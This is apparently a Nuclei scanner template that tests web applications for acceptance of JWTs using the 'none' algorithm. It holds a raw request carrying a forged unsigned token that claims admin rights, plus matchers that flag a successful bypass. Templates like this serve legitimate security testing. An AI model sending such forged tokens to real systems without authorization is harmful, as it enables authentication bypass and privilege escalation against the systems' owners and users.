id: gs-jwt-none-algorithm
info:
  name: JWT None Algorithm Accepted
  author: GhillieSuite-EX
  severity: critical
  description: |
    The application accepts JWT tokens with the "none" algorithm,
    allowing attackers to forge arbitrary JWT tokens without a secret key.
    This leads to authentication bypass and privilege escalation.
  tags: auth-bypass,jwt,bb-custom
  reference:
    - https://portswigger.net/web-security/jwt

http:
  - raw:
      - |
        GET {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkdoaWxsaWVTdWl0ZSIsImFkbWluIjp0cnVlLCJpYXQiOjE1MTYyMzkwMjJ9.
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        negative: true
        words:
          - "invalid"
          - "unauthorized"
          - "forbidden"
          - "expired"
          - "error"
        condition: and
